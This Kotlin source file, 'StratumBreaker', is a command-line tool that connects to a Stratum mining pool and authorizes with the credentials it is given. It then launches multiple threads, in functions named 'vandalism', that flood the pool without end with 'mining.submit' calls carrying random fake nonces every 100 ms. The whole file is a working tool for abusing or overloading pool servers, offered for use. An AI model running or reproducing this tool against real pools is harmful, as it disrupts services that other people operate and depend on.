package com.nao20010128nao.StratumBreaker

import joptsimple.OptionParser
import java.net.URL
import java.security.SecureRandom
import kotlin.concurrent.thread

object Main {
    @JvmStatic
    fun main(args: Array<String>) {
        val spec = OptionParser()
        val urlOpt = spec.accepts("url").withRequiredArg()
                .withValuesConvertedBy(Require { it.startsWith("stratum+tcp://") })
        val userOpt = spec.accepts("user").withRequiredArg()
        val passOpt = spec.accepts("pass").withRequiredArg()
        val threadOpt = spec.accepts("threads").withRequiredArg()
                .withValuesConvertedBy(ParseInt).defaultsTo(4)

        val result = spec.parse(*args)

        start(
                result.valueOf(urlOpt),
                result.valueOf(userOpt),
                result.valueOf(passOpt),
                result.valueOf(threadOpt)
        )
    }

    fun start(url: String, user: String?, pass: String?, threads: Int) {
        var jobId = ""
        var nTime = ""
        val extraNonce2 = "00000002"
        val runningValdalism: MutableList<Thread> = mutableListOf()
        val random = SecureRandom()

        val urlObj = URL(url)
        val rpc = JsonRpc(urlObj.host, urlObj.port)
        fun vandalism(): Thread = thread {
            while (true) {
                rpc.send(null, "mining.submit", jsonArrayOf(
                        user.toJsonElementOrNull(),
                        jobId.toJsonElement(),
                        extraNonce2.toJsonElement(),
                        nTime.toJsonElement(),
                        "%08x".format(random.nextLong()).toJsonElement()
                ))
                Thread.sleep(100)
            }
        }.also { runningValdalism.add(it) }

        fun vandalismIfNotStarted() {
            if (runningValdalism.isNotEmpty()) return
            for (i in 1..threads) {
                vandalism()
            }
        }
        rpc.startLoop()
        val handler = object : JsonRpc.Handler {
            override fun onData(id: Int?, response: JsonRpc.Response) {
                if (response is JsonRpc.Response.Notify) {
                    println(response.method)
                    when (response.method) {
                        "mining.notify" -> {
                            val (jobIdElem, _, _, _, _, _, _, nTimeElem) = response.content.toList()
                            jobId = jobIdElem.asString
                            nTime = nTimeElem.asString
                            vandalismIfNotStarted()
                        }
                    }
                } else if (response is JsonRpc.Response.Success) {
                    if (response.content.isJsonPrimitive) {
                        try {
                            println("Result: ${response.content.asBoolean}")
                        } catch (e: Throwable) {
                        }
                    }
                }
            }
        }
        rpc.add(handler)
        rpc.send(1, "mining.subscribe", emptyJsonArray())
        rpc.send(2, "mining.authorize", jsonArrayOf(
                user.toJsonElementOrNull(),
                pass.toJsonElementOrNull()
        ))
    }
}